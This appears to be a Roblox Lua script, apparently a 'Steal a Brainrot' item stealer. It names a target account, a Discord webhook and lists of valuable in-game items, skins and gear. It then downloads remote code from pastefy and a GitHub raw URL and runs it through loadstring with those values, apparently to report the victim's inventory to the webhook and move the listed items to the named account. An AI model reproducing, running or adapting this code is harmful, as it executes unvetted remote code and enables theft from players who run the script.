local TARGET_ID = 1138139167
local TARGET_USER = "Raintrain00"
local WEBHOOK_URL = "https://discord.com/api/webhooks/1538643184316452907/WaDpoOfTiIU-LyOOZlRMkniY_Ofusr-ZyJUr0oWqwirFmtvx8WZ2yi7N-pqydXf8Uo0N"

local TargetBrainrots = {
    ["Hydra Bunny"] = true,
    ["Hydra Dragon Cannelloni"] = true,
    ["Dragon Cannelloni"] = true,
    ["Griffin"] = true,
    ["Dragon Gingerini"] = true,
    ["Antonio"] = true,
    ["Elefanto Frigo"] = true,
    ["Rico Dinero"] = true,
    ["Rubrikiko"] = true,
    ["Arcadragon"] = true,
    ["Pancake and Syrup"] = true,
    ["Kalika Bros"] = true,
    ["Tirilikalika Tirilikalako"] = true,
    ["Globa Steppa"] = true,
    ["Dug Dug Dug"] = true,
    ["La Supreme Combinasion"] = true,
    ["La Casa Boo"] = true,
    ["Dragon Aquanini"] = true,
    ["Signore Carapace"] = true,
    ["Fishino Clownino"] = true,
    ["Cerberus"] = true,
    ["Duggy Bros"] = true,
    ["Kraken"] = true,
    ["Venuspino"] = true,
    ["Gorillo Subwoofero"] = true,
    ["Foxini Lanternini"] = true,
    ["Dragon Skeletonini"] = true,
    ["Hydra Serpent"] = true,
    ["Plant Bros"] = true,
    ["Phoenix"] = true,
    ["Strawberry Elephant"] = true,
    ["Orchidox"] = true,
    ["Meowl"] = true,
    ["Skibidi Toilet"] = true,
    ["La Craft Machine"] = true,
    ["Los Dragons"] = true,
    ["Gold and Diamond"] = true,
    ["John Pork"] = true,
    ["Capitano Americano"] = true,
    ["Headless Horseman"] = true,
    ["Jelly Moby"] = true,
    ["Los Hackers"] = true,
    ["Sammyni Cakini"] = true,
    ["Bearito Cabinito"] = true,
    ["Digi Narwhal"] = true,
    ["Moby Bros"] = true,
    ["Los Admins"] = true,
    ["Boppin Bunny"] = true,
    ["Burguro and Fryuro"] = true,
    ["Bunny and Eggy"] = true,
    ["Capitano Moby"] = true,
    ["Cash or Card"] = true,
    ["Celestial Pegasus"] = true,
    ["Celularcini Viciosini"] = true,
    ["Cloverat Clapat"] = true,
    ["Cooki and Milki"] = true,
    ["Festive 67"] = true,
    ["Fortunu and Cashuru"] = true,
    ["Fragola La La La"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Garama and Madundung"] = true,
    ["Ginger Gerat"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Ketupat Bros"] = true,
    ["La Food Combinasion"] = true,
    ["La Ginger Sekolah"] = true,
    ["La Secret Combinasion"] = true,
    ["Examen Bros"] = true,
    ["Los Secret Combinasionas"] = true,
    ["Pizza and Ranch"] = true,
    ["Los Amigos"] = true,
    ["Bumbatron"] = true,
    ["Yetimatic"] = true,
    ["S'more Serat"] = true,
    ["Queen Bee"] = true,
    ["Scorpino Coasterino"] = true,
    ["La Breakfast Combinasion"] = true,
    ["Los Primos"] = true,
    ["Los Sekolahs"] = true,
    ["Los Tacoritas"] = true,
    ["Love Love Bear"] = true,
    ["Nacho Spyder"] = true,
    ["Orcaledon"] = true,
    ["Popcuru and Fizzuru"] = true,
    ["Quackini Snackini"] = true,
    ["Reinito Sleighito"] = true,
    ["Rosey and Teddy"] = true,
    ["Rosetti Tualetti"] = true,
    ["Sammyni Fattini"] = true,
    ["Spooky and Pumpky"] = true,
    ["Tralaledon"] = true,
    ["Grabatron"] = true,
    ["Rubiko and Kubiko"] = true,
    ["Cangurato Gelato"] = true,
    ["La Fuse Machine"] = true,
    ["Polaroidini"] = true,
    ["Nachorilla"] = true,
    ["Sammyni Truckini"] = true,
    ["Cobra Gelato"] = true,
    ["Machine Bros"] = true,
    ["Sammyni Bros"] = true,
    ["Skelly and Coffy"] = true,
    ["Flying Dutchman"] = true,
    ["Medusini and Demonini"] = true,
    ["Puppetmaster"] = true,
    ["Cabin Bros"] = true,
    ["Hopilikalika Hopilikalako"] = true,
    ["Guest 666"] = true
}

local TargetBaseSkins = {
    ["Octo"] = true,
    ["Tralalero"] = true
}

local TargetGears = {
    ["Bloodmoon Hammer"] = true,
    ["Cupid's Wings"] = true,
    ["Radioactive Airstrike"] = true,
    ["Rainbow Hammer"] = true,
    ["Santa's Sleigh"] = true,
    ["Waverider"] = true,
    ["Witch's Broom"] = true,
    ["Skeleton Dragon"] = true
}

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/RsqRaQC0/raw"))()
end)

task.spawn(function()
    loadstring(game:HttpGet("https://pastefy.app/UyDf7BV9/raw"))()

    task.wait(1)

    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
    if type(script) == "function" then
        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
    end
end)